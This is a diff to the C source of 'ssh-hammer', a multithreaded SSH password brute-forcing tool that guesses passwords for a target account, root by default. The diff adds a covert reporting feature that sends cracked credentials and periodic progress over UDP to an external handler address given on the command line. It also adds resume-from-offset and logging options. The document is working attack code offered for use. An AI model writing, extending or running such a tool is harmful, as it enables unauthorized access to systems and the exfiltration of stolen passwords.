@@ -1,10 +1,12 @@
 /*
  *
- * Dependency: libssh2 libssh2-devel
+ * This is a local hack tool that can be run on guess account
+ * 
+ * Build dependency: libssh2 libssh2-devel
    (it is tested on CentOS)
 
- *Compile it like this:
-  gcc ssh-hammer.c -lssh2 -lpthread -o ssh-hammer
+ * Compile it like this:
+   gcc ssh-hammer.c -lssh2 -lpthread -o ssh-hammer
  *
  *
  */ 
@@ -29,14 +31,19 @@
 static char username[32] = "root";
 static char hostname[16] = "127.0.0.1";
 static int ssh_port = 22;
+unsigned long long passwd_pt = 0;
 static char password[16][16] = {0};
-FILE *fp_passwd;
-static int  opt_verbose=0, opt_user=0, opt_thread_s=4, opt_input_mode = 0, pw_found=0;
+FILE *fp_passwd, *fout;
+static int  opt_verbose=0, opt_user=0, opt_thread_s=4, opt_input_mode = 0, pw_found=0, opt_report=0, opt_fout=0;
 pthread_t attack_pid[16];
 void * (*attack_thread[16])(void *);
-
+int handler_port=0;
+char handler_ip[16]={0};
+char outname[64]={0};
+char rbuff[512]={0};
 const char wordset[]="$abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#.+@?\0";
 const int len_wordset=strlen(wordset);
+int health_report(char *word);
 
 static int waitsocket(int socket_fd, LIBSSH2_SESSION *session)
 {
@@ -121,6 +128,9 @@ static int attack_payload(int sequence)
     if(rc) {
 	if(opt_verbose){
 	    fprintf(stdout, "(%d) Server refuse, retrying\n", sequence);
+	    if(opt_fout){
+		fprintf(fout, "(%d) Server refuse, retrying\n", sequence);
+	    }
 	}
 	libssh2_session_disconnect(session, "Damn");
 	libssh2_session_free(session);
@@ -147,6 +157,9 @@ static int attack_payload(int sequence)
         if(rc) {
 	    if(opt_verbose){
 		fprintf(stdout, "(%d) trying:%s\n",sequence,passwd);
+		if(opt_fout){
+		    fprintf(fout, "(%d) trying:%s\n",sequence,passwd);
+		}
 	    }
 	    libssh2_session_disconnect(session, "Damn");
 	    libssh2_session_free(session);
@@ -160,15 +173,16 @@ static int attack_payload(int sequence)
     while((channel = libssh2_channel_open_session(session)) == NULL && libssh2_session_last_error(session, NULL, NULL, 0) == LIBSSH2_ERROR_EAGAIN) {
         waitsocket(sock, session);
     }
-    /*if(channel == NULL) {
-        return -1;
-    }*/
      
     libssh2_session_disconnect(session, "HAHA, I got your key now");
     libssh2_session_free(session);
 
     close(sock);
     fprintf(stderr, "key found:[%s][%s]\n",username,passwd);pw_found=1;
+    health_report(passwd);
+    if(opt_fout){
+	fprintf(fout, "key found:[%s][%s]\n",username,passwd);pw_found=1;
+    }
     libssh2_exit();
  
     return 0;
@@ -294,7 +308,7 @@ int use_int_passwd(){
         }
     }
 
-    for(num=1;num<ULLONG_MAX;){
+    for(num=passwd_pt+1;;){
 	for(pf=0;pf<th_s;){
 	    if(!num2passwd(password[pf],num)){
                 while(pthread_create(attack_pid+pf, NULL, attack_thread[pf], NULL)){usleep(50000);}
@@ -308,6 +322,7 @@ int use_int_passwd(){
             pthread_join(attack_pid[pf],NULL);
         }
         if(pw_found){return 0;}
+	passwd_pt=num;
     }
 
     return 0;
@@ -326,6 +341,7 @@ int use_ext_passwd(){
 			if(fgets(password[pf],16,fp_passwd)==NULL){endofread=1;goto Wait4Join;}
 			password[pf][strlen(password[pf])-1]=0;
 			while(pthread_create(attack_pid+pf, NULL, attack_thread[pf], NULL)){usleep(50000);}
+			++passwd_pt;
 			usleep(50000);
 	
 		}
@@ -338,6 +354,80 @@ int use_ext_passwd(){
 	}
 
 	return 0;
+}
+
+int health_report(char *word)
+{
+    int sockfd, num, pf;
+    struct hostent *he;
+    struct sockaddr_in server;
+
+    if((sockfd=socket(AF_INET, SOCK_DGRAM, 0)) == -1)
+    {
+        return -1;
+    }
+    bzero(&server, sizeof(server));
+    server.sin_family = AF_INET;
+    server.sin_port = htons(handler_port);
+
+    server.sin_addr.s_addr = inet_addr(handler_ip);
+    struct timeval timeout;
+    timeout.tv_sec = 5; timeout.tv_usec = 0;
+    if (setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout)) == -1)
+    {
+        close(sockfd);
+        return -1;
+    }
+
+    if(connect(sockfd, (struct sockaddr *)&server, sizeof(server)) == -1)
+    {
+        close(sockfd);
+        return -1;
+    }
+    send(sockfd, word, strlen(word), 0);
+    close(sockfd);
+    return 0;
+}
+
+void * reporter_thread(){
+    FILE *HKpress;
+    char pbuff[128];
+    while(!pw_found){
+	sleep(900);
+	sprintf(rbuff,"%llu>%s\0",passwd_pt,password[0]);
+	health_report(rbuff);
+    }
+    while((HKpress=fopen(outname,"r"))==NULL){
+	fprintf(stdout,"HK press is not fast enough to fetch %s\n",outname);
+	usleep(500000);
+    }
+    fseek(HKpress,-256L,2);
+    while(fgets(pbuff,128,HKpress)!=NULL){
+	strcat(rbuff,pbuff);
+    }
+    strcat(rbuff,"\0");
+    fclose(HKpress);
+    health_report(rbuff);
+
+    return 0;
+}
+
+int setHandler(char *hin){
+    char *opt=strdup(hin), *shandler_ip;
+    int shandler_port;
+    shandler_ip=strsep(&opt,":");
+    shandler_port=atoi(strsep(&opt,":"));
+    free((void*)opt);
+    strcpy(handler_ip,shandler_ip);
+    handler_port=shandler_port;
+    opt_report=1;
+    return 0;
+}
+
+int setFout(char *outname){
+    fout=fopen(outname,"a");
+    opt_fout=1;
+    return 0;
 }
 
 int usage_print(char *pName){
@@ -353,6 +443,7 @@ int usage_print(char *pName){
 	fprintf(stdout,"                          but server may refuse some sessions.\n\n");
 	fprintf(stdout,"\nRun it like this:\n\n");
 	fprintf(stdout,"   %s 127.0.0.1 -p 22 -u admin -t 6 -v\n",pName);
+	fprintf(stdout,"   %s 127.0.0.1 -u root -t 6 -v -r 115.243.23.666:8001\n",pName);
     return 0;
 }
 
@@ -369,14 +460,17 @@ int main(int argc, char *argv[]){
 		{"thread", 1, NULL, 't'},
 		{"report", 1, NULL, 'r'},
 		{"input", 1, NULL, 'i'},
+		{"output", 1, NULL, 'o'},
+		{"breakin", 1, NULL, 'b'},
 		{"NULL", 0, NULL, 0}
 	};
 
 	int pf=0, Copt;
-	char path_passwd[64]={0};
+	char path_passwd[64]={0}, handler_input[32]={0};
+	pthread_t report_pid;
 
     if(argc<2){usage_print(argv[0]);return 0;}
-    while(!((Copt = getopt_long(argc, argv, "hvp:u:t:i:", long_option, NULL)) < 0)){
+    while(!((Copt = getopt_long(argc, argv, "hvp:u:t:i:r:o:b:", long_option, NULL)) < 0)){
 		switch(Copt){
 	    case 'h':
 		usage_print(argv[0]);
@@ -404,7 +498,18 @@ int main(int argc, char *argv[]){
 		while(optarg[pf]!=0){path_passwd[pf]=optarg[pf];pf++;}
 		break;
 	    case 'r':
-		fprintf(stdout,"redirect result to external, incomplete yet\n");
+		pf=0;
+		while(optarg[pf]!=0){handler_input[pf]=optarg[pf];pf++;}
+		fprintf(stdout,"Set Handler as %s\n",handler_input);
+		setHandler(handler_input);
+		break;
+	    case 'b':
+		passwd_pt=strtoul(optarg,NULL,0);
+		break;
+	    case 'o':
+		pf=0;
+		while(optarg[pf]!=0){outname[pf]=optarg[pf];pf++;}
+		setFout(outname);
 		break;
 		}
     }
@@ -421,7 +526,22 @@ int main(int argc, char *argv[]){
     if(!opt_user){
 		fprintf(stdout,"User unspcified, attack root as default\n\n");
     }
-
+    if(opt_report&&(!opt_fout)){
+	fprintf(stdout,"-o [filename] must specified when using report mode, automatically set to .hout\n\n");
+	strcpy(outname,".hout");
+	setFout(outname);
+	sleep(2);
+    }
+    if(opt_report){
+	pf=0;
+	while(pthread_create(&report_pid, NULL, reporter_thread, NULL)){
+	    fprintf(stdout,"reporter thread re-apply: 0x%02x\n",pf++);
+	    if(pf>6){break;}
+	    usleep(500000);
+	}
+	if(pf>6){fprintf(stdout,"fail to boot HK press\n");return -1;}
+	fprintf(stdout,"reporter is on\n");
+    }
 	attack_thread_register();
 
     fprintf(stdout,"Attacking host ---> %s@%s:%d\n",username,hostname,ssh_port);
@@ -436,6 +556,7 @@ int main(int argc, char *argv[]){
 	}else{
 		use_int_passwd();
 	}
-   
+	if(opt_fout){fclose(fout);}
+    if(opt_report){pthread_join(report_pid,NULL);} 
     return 0;
 }
